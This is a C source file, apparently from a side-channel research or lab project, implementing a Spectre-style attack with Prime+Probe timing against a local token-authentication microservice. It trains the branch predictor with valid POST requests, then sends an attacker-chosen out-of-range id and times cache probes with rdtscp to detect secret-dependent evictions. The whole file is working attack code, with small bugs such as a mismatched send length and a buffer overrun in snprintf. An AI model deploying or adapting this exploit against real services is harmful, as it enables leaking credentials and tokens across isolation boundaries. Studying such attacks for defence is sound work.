#include <stdio.h>
#include <stdint.h>

#include <x86intrin.h>
#include <curl/curl.h>

#include "attacker.h"

#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

// cache metrics
#define WAYS 8
#define SETS 64
#define LINE_SIZE 64
#define L1_SIZE (WAYS * SETS * LINE_SIZE)
#define NO_LINES (WAYS * SETS)


// prime+probe
#define TRAINING_REPS 10
#define ATTACK_RUNS 10000
#define BASELINE_RUNS 10000
#define EVICTION_THRESHOLD 0

// socket
#define PORT 8080
#define INET "127.0.0.1"


uint8_t probe_array[L1_SIZE] __attribute__((aligned(4096))); // allocates int array of size = L1_SIZE and aligns to page
//CURL *curl_handle;
uint64_t c_threshold;
int shuffle_arr[SETS];



int main(int argc, char* argv[]) {
     // setup socket connection 
    int clientfd;
    struct sockaddr_in servaddr;
    open_socket(&clientfd, &servaddr);
    connect(clientfd, (struct sockaddr *)&servaddr, sizeof(servaddr));

    // shuffle prob arr access route - avoid hardwre prefetching
    for (int i = 0; i < SETS; i++) {
        shuffle_arr[i] = i; // shuffle_arr = {0-63}
    }
    shuffle(shuffle_arr);



    //cache_threshold();
    printf("Probe array base address: %p\n", (void*)probe_array);


    // find threshold
    c_threshold = 95;//cache_threshold(); // or set ~100

    // prep attack and training data for request
    char *valid_data = 
    "POST /token-auth/ HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "Content-Length: 37\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "username=user1&password=password&id=0000";
    char *baseline_data = 
    "POST /token-auth/ HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "Content-Length: 37\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "username=user1&password=password&id=4100";
    char attack_data[256];
    get_inputs(attack_data, argc, argv);
    
    char buf[1024];
    int baseline[SETS] = {0}; 
    int count[SETS] = {0}; // records sets that have been touched

    // get page table entries in cache lookup
    for (int i = 0; i < SETS; i++) {
        for (int w = 0; w < WAYS; w++) {
            volatile uint8_t *addr = &probe_array[(w * 4096) + (i * 64)];
            uint8_t dummy = *addr; 
        }
    }
    _mm_mfence();
  
    for (int j = 0; j < ATTACK_RUNS; j++) {
       

        // Train BP
        for(int i = 0; i < TRAINING_REPS; i++){
            make_request(valid_data, &clientfd);
        }

        //prime
        for (unsigned int i = 0; i < SETS; i++){
            for(unsigned int w = 0; w < WAYS; w++){
                volatile uint8_t tmp = probe_array[shuffle_arr[i] * LINE_SIZE + (w * 4096)];
            }
        }
        _mm_mfence();

        // send baseline
        send(clientfd, baseline_data, strlen(attack_data), 0);
        for (volatile int i = 0; i < 150; i++);
        //probe
        check_cache_presence(baseline);
        //recv
        recv(clientfd, buf, sizeof(buf), 0);


        // = ATTACK =
        // Train BP
        for(int i = 0; i < TRAINING_REPS; i++){
            make_request(valid_data, &clientfd);
        }

        //prime
        for (unsigned int i = 0; i < SETS; i++){
            for(unsigned int w = 0; w < WAYS; w++){
                volatile uint8_t tmp = probe_array[shuffle_arr[i] * LINE_SIZE + (w * 4096)];
            }
        }
        _mm_mfence();

        // send attack
        send(clientfd, attack_data, strlen(attack_data), 0);
        for (volatile int i = 0; i < 150; i++);
        //probe
        check_cache_presence(count);
        
        recv(clientfd, buf, sizeof(buf), 0);
    } 

    printf("\n===== Eviction Difs =====\n");
    for (int i = 0; i < SETS; i++) { 
        int diff = count[i] - baseline[i];
        printf("Set %d: %d -> (attack: %d, baseline: %d)\n", i, diff, count[i], baseline[i]); // print diff
    }
    //curl_easy_cleanup(curl_handle);
    close(clientfd);
    return 0;

}


void shuffle(int shuffle_arr[]){
    for (int i = 0; i < SETS; i++){
        int tmp = shuffle_arr[i];
        int shuffle_index = rand() % SETS;
        shuffle_arr[i] = shuffle_arr[shuffle_index];
        shuffle_arr[shuffle_index] = tmp;
    }
}

void prime_cache(){
    // Prime L1 cache
    // loop through probe array - one iteration = one cache line hit (makes sure it persists in L1)
    for (unsigned int i = 0; i < SETS; i++){
        for(unsigned int w = 0; w < WAYS; w++){ // primes each way
            volatile uint8_t tmp; 
            tmp =  probe_array[shuffle_arr[i] * LINE_SIZE + (w * 4096)]; // forces load
        }
    }
    
}


void check_cache_presence(int *count){
    uint64_t t1, t2;
    unsigned int pid;
    volatile uint8_t junk = 0;
    for (unsigned int i = 0; i < SETS; i++){
        int set = shuffle_arr[i]; // determine random set to probe
        int wayEvictions = 0;
        //for (int w = 0; w < WAYS; w ++){
            //uint8_t *addr = &probe_array[(set * LINE_SIZE) + (w * 4096)];
            _mm_lfence();
            t1 = __rdtscp(&pid); 
            _mm_lfence();

            for (int w = 0; w < 4; w++) {
                junk ^= probe_array[(w * 4096) + (set * 64) + (junk & 0)];
            }
            _mm_lfence();
            t2 = __rdtscp(&pid);
            _mm_lfence();
                
            if (t2 - t1 > c_threshold){ // if way evicted count one set eviction and move onto next set
                count[set] ++;
                //wayEvictions +=1;    
                //break;

            }
        
        // if (wayEvictions == 1){
        //     count[set] ++;
        // }
        
    }
    
    // printf("%d/%d cache hits\n", present, NO_LINES);
}


void primeprobe(char *data, int *clientfd, int *results) {
    prime_cache(); // prime L1 with probe array
    _mm_mfence(); // wait for prime to compelte before sending bad request

    send(*clientfd, data, strlen(data), 0);
    for (volatile int i = 0; i < 100; i++); 
    
    _mm_lfence();
    check_cache_presence(results);

    char buf[1024];
    recv(*clientfd, buf, sizeof(buf), 0); 
    _mm_mfence();
    
}
// send request with curl request for token to microservice
void make_request(char *data, int *clientfd){
    // curl_easy_setopt(curl_handle, CURLOPT_POSTFIELDS, data);
    // curl_easy_perform(curl_handle); 
    send(*clientfd, data, strlen(data), 0);
    char buf[256];
    recv(*clientfd, buf, 256, 0);
    _mm_lfence();
}

// returns junk so that curl doesnt write to console
size_t write_junk(void *buffer, size_t size, size_t nmemb, void *userp)
{
    (void)buffer;
    (void)userp;
    return size * nmemb;
}


void get_inputs(char attack_data[], int argc, char* argv[]){

    char *attack_id = "4096";
    if (argc == 2){
        attack_id = argv[1]; 
    }
    char body[128];
    int body_len = snprintf(body, sizeof(body), "username=user1&password=password&id=%s", attack_id);

    snprintf(attack_data, 512, 
        "POST /token-auth/ HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Content-Length: %d\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n\r\n"
        "%s", body_len, body);
}

void open_socket(int *clientfd, struct sockaddr_in *servaddr){
    
    *clientfd = socket(AF_INET, SOCK_STREAM, 0);

    servaddr->sin_family = AF_INET;
    servaddr->sin_port = htons(PORT);
    servaddr->sin_addr.s_addr = inet_addr(INET);
}



// finds hit and miss time  -need to implement loop to find avg + determine cache threshold
volatile int test_data = 2;
int cache_threshold(){
    uint64_t t1, t2, time; 
    uint64_t min = UINT64_MAX;
    uint64_t max = 0;
    unsigned int pid;

    for (int i = 0; i < 1000; i++){
        pid = test_data;
        pid = test_data;

        _mm_lfence();
        t1 = __rdtscp(&pid);
        _mm_lfence();

        pid = test_data;

        _mm_lfence();
        t2 = __rdtscp(&pid);
        _mm_lfence();

        time = t2 - t1;
        if (time > max){
            max = time;
        }
    }


    for (int i = 0; i < 1000; i++){
        _mm_clflush((void*)&test_data);
        _mm_mfence();

        _mm_mfence();
        t1 = __rdtscp(&pid);
        _mm_mfence();

        pid = test_data;

        t2 = __rdtscp(&pid);
        _mm_mfence();

        time = t2 - t1;
        if (min > time){
            min = time;
        }
    }
    
    uint64_t threshold = (min + max)/2;
    printf("fastest miss: %ld\nslowest hit: %ld\n threshold: %ld", min, max, threshold);
    return threshold;
}
